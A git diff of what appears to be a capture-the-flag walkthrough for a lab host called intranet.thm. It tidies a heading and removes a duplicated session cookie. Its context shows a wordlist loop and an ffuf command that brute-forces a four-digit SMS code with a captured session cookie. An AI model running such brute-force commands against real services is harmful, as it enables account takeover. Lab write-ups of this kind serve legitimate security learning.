@@ -393,12 +393,6 @@ Connection: close
 ...
 ```
 
-eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN0nAA.CLnAPZ2JQMsOgOzQ2DmOonzQJVQ
-
-eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN0nAA.CLnAPZ2JQMsOgOzQ2DmOonzQJVQ
-
-
-
 <img width="1272" height="366" alt="image" src="https://github.com/user-attachments/assets/f8535953-8b46-4177-865d-49619a0d4fa8" />
 
 <br>
@@ -421,7 +415,7 @@ for i in {0000..9999}; do echo "$i"; done > support
 9999
 ```
 
-<h2 align="center">Ffuf</h2>
+<h2 align="center">ffuf</h2>
 
 ```bash
 :~/Intranet# ffuf -u http://intranet.thm:8080/sms -c -w support -d 'sms=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -b 'session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN0nAA.CLnAPZ2JQMsOgOzQ2DmOonzQJVQ' -fc 200
@@ -452,7 +446,6 @@ ________________________________________________
 
 6285                    [Status: 302, Size: 197, Words: 18, Lines: 6]
 :: Progress: [10000/10000] :: Job [1/1] :: 625 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
-
 ```
 
 <img width="1350" height="532" alt="image" src="https://github.com/user-attachments/assets/7573adfb-2e16-4a0c-8077-4f0f2f68ae68" />
